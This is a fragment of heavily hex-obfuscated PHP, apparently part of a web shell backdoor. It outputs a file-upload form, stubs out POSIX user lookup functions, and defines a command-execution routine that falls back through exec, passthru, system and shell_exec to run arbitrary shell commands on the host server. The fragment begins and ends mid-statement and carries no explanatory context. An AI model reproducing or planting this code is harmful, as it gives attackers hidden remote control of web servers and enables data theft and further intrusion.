73e\x74"]:"";echo "\x27>\n\t\t\x3cspan\x3eU\x70loa\x64\x20file:</\x73\x70\x61\x6e>\x3cb\x72\x3e<\x69npu\x74 class\x3d\x22\x74oo\x6csInp\"\x20\x74y\x70\x65=fi\x6c\x65 na\x6d\x65\x3d\x66\x3e\x3cinput t\x79pe=\x73u\x62m\x69t\x20\x76al\x75\x65=\x22\x3e>\x22>\x3c/f\x6f\x72\x6d>";echo ${${"G\x4c\x4fBA\x4c\x53"}["\x6b\x74\x66\x69ti\x65\x70c"]};echo "</t\x64>\n\t\x3c/\x74\x72>\n\n\x3c/\x74\x61\x62\x6c\x65\x3e\n</\x64\x69v>\n\x3c/\x62\x6fdy\x3e\x3c/\x68t\x6d\x6c\x3e\n";}if(!function_exists("\x70osix_\x67\x65tp\x77\x75id")&&(strpos($GLOBALS["\x64i\x73\x61ble\x5ff\x75nc\x74\x69ons"],"\x70\x6f\x73\x69\x78_getp\x77uid")===false)){function posix_getpwuid($p){return false;}}if(!function_exists("posix\x5fge\x74\x67\x72\x67\x69d")&&(strpos($GLOBALS["\x64\x69s\x61\x62l\x65_f\x75\x6e\x63\x74ion\x73"],"p\x6fs\x69\x78\x5f\x67e\x74grgid")===false)){function posix_getgrgid($p){return false;}}function ex($in){$rvddemfeigl="\x69\x6e";$npirurouj="\x6fu\x74";$ywavrjx="\x6fu\x74";${$ywavrjx}="";${"\x47\x4cO\x42\x41\x4cS"}["hq\x6dg\x70\x7a\x71\x63\x79v"]="\x66";if(function_exists("exe\x63")){$scfqysixmpfb="\x6fut";@exec(${${"\x47L\x4f\x42A\x4cS"}["\x63\x76\x74m\x72\x74y\x6d\x79\x66\x67"]},${$scfqysixmpfb});${${"G\x4c\x4f\x42\x41\x4c\x53"}["fp\x70\x68b\x6a\x7a\x72\x64\x76"]}=@join("\n",${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["f\x70p\x68\x62\x6a\x7a\x72d\x76"]});}elseif(function_exists("\x70a\x73s\x74h\x72\x75")){ob_start();@passthru(${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["cvt\x6d\x72\x74\x79\x6d\x79\x66g"]});${${"GL\x4f\x42\x41\x4c\x53"}["\x66p\x70\x68bj\x7a\x72d\x76"]}=ob_get_clean();}elseif(function_exists("\x73\x79\x73t\x65m")){ob_start();@system(${${"G\x4cO\x42\x41\x4c\x53"}["cv\x74\x6d\x72\x74ym\x79f\x67"]});${${"\x47L\x4fB\x41\x4c\x53"}["\x66p\x70\x68bj\x7a\x72\x64v"]}=ob_get_clean();}elseif(function_exists("s\x68\x65\x6cl\x5fex\x65c")){${"G\x4c\x4fB\x41\x4c\x53"}["\x75\x71\x71\x79f\x63\x70\x72\x77ps"]="\x69n";${"\x47\x4cO\x42ALS"}["ik\x6fp\x69\x65ym\x62c"]="out";${${"\x47\x4c\x4f\x42\x41\x4c\x53